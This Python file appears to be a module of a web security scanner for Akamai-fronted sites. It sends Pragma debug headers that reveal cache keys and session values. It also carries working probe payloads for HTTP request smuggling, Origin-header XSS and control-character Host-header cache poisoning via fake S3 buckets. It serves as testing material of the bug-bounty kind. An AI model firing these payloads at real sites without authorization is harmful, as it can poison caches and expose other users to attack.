#!/usr/bin/env python3

import socket
import ssl
import urllib.parse

from utils.style import Colors
from utils.utils import configure_logger, random, re, requests, sys, urlparse

logger = configure_logger(__name__)

CTRL_HEADERS: list[str] = ["\x0b", "\x0c", "\x1c", "\x1d", "\x1e", "\x1f"]

REGIONS: list[str] = [
    "us-east-1",
    "us-east-2",
    "us-west-1",
    "us-west-2",
    "ap-south-1",
    "ap-northeast-3",
    "ap-northeast-2",
    "ap-southeast-1",
    "ap-southeast-2",
    "ca-central-1",
    "eu-central-1",
    "eu-west-1",
    "eu-west-2",
    "eu-west-3",
    "eu-north-1",
    "sa-east-1",
    "me-south-1",
    "ap-east-1",
    "ap-northeast-1",
]

TIMEOUT = 6  # seconds
READ_LIMIT = 8192  # read only the first 8 KB – enough to spot the error
domain_regex = re.compile(r"^[a-z0-9.-]+\.[a-z]{2,}$", re.I)


def colour(value: str) -> str:
    if value == "<<ENCRYPTED>>":
        return Colors.GREEN
    if re.match(r"^https?://", value, re.I) or domain_regex.match(value):
        return Colors.BLUE
    if re.match(r"^\d+$", value):
        return Colors.MAGENTA
    return Colors.RED


def akamai(url: str, s: requests.Session) -> None:
    """
    https://techdocs.akamai.com/edge-diagnostics/docs/pragma-headers
    akamai-x-get-nonces
    pragma_debug = [ "akamai-x-ew-debug-rp", "akamai-x-ew-onoriginrequest", "akamai-x-ew-onoriginresponse", "akamai-x-ew-onclientresponse"]
    """
    pragma_list = {
        "akamai-x-cache-on": "X-Cache",
        "akamai-x-get-cache-key, akamai-x-get-true-cache-key": "X-Cache",
        "akamai-x-cache-remote-on": "X-Cache-Remote",
        "akamai-x-check-cacheable": "X-Check-Cacheable",
        "akamai-x-get-true-cache-key": "X-True-Cache-Key",
        "akamai-x-get-cache-key": "X-Cache-Key",
        "akamai-x-serial-no": "X-Serial",
        "akamai-x-get-request-id": "X-Akamai-Request-ID",
        "akamai-x-get-extracted-values": "X-Akamai-Session-Info",
        "akamai-x-get-ssl-client-session-id": "x-akamai-ssl-client-sid",
        "akamai-x-ew-debug": "X-Akamai-EdgeWorker",
        "akamai-x-ew-onclientrequest": "X-Akamai-EdgeWorker",
        "akamai-x-ew-debug-subs": "X-Akamai-EdgeWorker",
    }

    for pgl in pragma_list:
        header = {"Pragma": pgl}
        res = pragma_list[pgl]
        try:
            req = s.get(url, verify=False, headers=header, timeout=10)
            # print(req.headers)
            if res in req.headers:
                if pgl == "akamai-x-get-extracted-values":
                    pattern = re.compile(r"name=([^;]+); value=([^,]+)")
                    matches = pattern.findall(req.headers[res])
                    segments = [
                        f"{name}={colour(value)}{value}{Colors.RESET}"
                        for name, value in matches
                    ]
                    print(f"{Colors.CYAN}   └── {url} | H:{header}{Colors.RESET}")
                    print("   - " + " | ".join(segments))
                else:
                    print(f"{Colors.CYAN}   └── {url} | H:{header}{Colors.RESET}")
                    print(f"   - {res}: {req.headers[res]}")
        except KeyboardInterrupt:
            print("Exiting")
            sys.exit()
        except Exception as e:
            logger.exception(e)

    req_smuggling(url, s)
    xss_akamai(url, s)
    cp_s3_akamai_raw(url)


"""
---------------------
Request smuggling on Akamai
    #https://medium.com/@jacopotediosi/worldwide-server-side-cache-poisoning-on-all-akamai-edge-nodes-50k-bounty-earned-f97d80f3922b
    #https://blog.hacktivesecurity.com/index.php/2022/09/17/http/
---------------------
"""


def req_smuggling(url: str, s: requests.Session) -> None:
    print(f"{Colors.CYAN}   └── Akamai Request smuggling test{Colors.RESET}")
    url = f"{url}?cb={random.randrange(999)}"

    headers = {
        "Connection": "Content-Length",
    }

    body = (
        "   \r\n\r\n"
        "   GET / HTTP/1.1\r\n"
        "   Host: www.example.com\r\n"
        "   X-Foo: x\r\n"
    )

    try:
        res_main = s.get(url, verify=False, timeout=10)
        response = s.get(url, headers=headers, data=body, verify=False, timeout=10)

        if response.status_code > 500 and response.status_code != res_main.status_code:
            print(
                f"  {Colors.YELLOW} └── [INTERESTING BEHAVIOR]{Colors.RESET} | {url} [{res_main.status_code} > {response.status_code}]\n     └── H {headers}\n     └── B {body}"
            )
    except Exception as e:
        logger.exception("req_smuggling", e)


"""
---------------------
XSS on Akamai
---------------------
"""


def xss_akamai(url: str, s: requests.Session) -> None:
    url = f"{url}?cb={random.randrange(999)}"

    headers = {"Origin": "'-alert(1)-'"}

    try:
        response = s.get(url, headers=headers, verify=False, timeout=10)
        for h in response.headers:
            if (
                "x-true-cache-key" in h.lower()
                and "origin" in response.headers[h.lower()]
            ):
                print(
                    f"  {Colors.YELLOW} └── [INTERESTING BEHAVIOR]{Colors.RESET} | {url} \n   └── H {headers}\n  "
                )
    except Exception as e:
        logger.exception("XSS Akamai", e)


"""
---------------------
CP with fake s3 bucket in Akamai
https://web.archive.org/web/20230101082612/https://spyclub.tech/2022/12/14/unusual-cache-poisoning-akamai-s3/
---------------------
"""


def raw_http_get(
    parsed: urllib.parse.ParseResult,
    extra_hdr_name: str,
    extra_hdr_value: str,
    path_qs: str,
) -> str:

    host, port = parsed.hostname, parsed.port or (
        443 if parsed.scheme == "https" else 80
    )

    req = (
        f"GET {path_qs} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"{extra_hdr_name}: {extra_hdr_value}\r\n"
        "Connection: close\r\n\r\n"
    ).encode()

    sock = socket.create_connection((host, port), timeout=TIMEOUT)
    if parsed.scheme == "https":
        sock = ssl.create_default_context().wrap_socket(sock, server_hostname=host)

    sock.sendall(req)
    data = sock.recv(READ_LIMIT).decode(errors="replace")
    sock.close()
    return data


def cp_s3_akamai_raw(url: str) -> None:
    print(f"{Colors.CYAN}   └── Akamai S3 cache-poisoning test{Colors.RESET}")

    target = urlparse(url)

    base_path = "/coucou.svg"

    for region in REGIONS:
        fake_host = f"nonexistent-12345.s3.{region}.amazonaws.com"

        rand = random.randint(1, 9_999_999)
        path_qs = f"{base_path}?cb={rand}"

        for ctrl in CTRL_HEADERS:
            hdr_name = f"{ctrl}Host"

            try:
                resp = raw_http_get(target, hdr_name, fake_host, path_qs)
                if "NoSuchBucket" in resp:
                    target_with_path = f"{target.scheme}://{target.netloc}{path_qs}"
                    print(
                        f"{Colors.YELLOW}   [+] POSSIBLE CP – origin reached {fake_host} with {hdr_name!r}{Colors.RESET}"
                    )
                    print(f"      Target URL: {target_with_path}\n")
            except Exception as e:
                logger.exception(
                    f"   [-] {fake_host} ({repr(ctrl)})  ->  Network error : {e}"
                )


if __name__ == "__main__":
    url_file = sys.argv[1]
    s = requests.Session()

    try:
        with open(url_file) as url_file_handle:
            urls = url_file_handle.read().splitlines()
            for url in urls:
                try:
                    akamai(url, s)
                except KeyboardInterrupt:
                    print("Exiting")
                    sys.exit()
                except Exception as e:
                    logger.exception(e)
    except KeyboardInterrupt:
        print("Exiting")
        sys.exit()
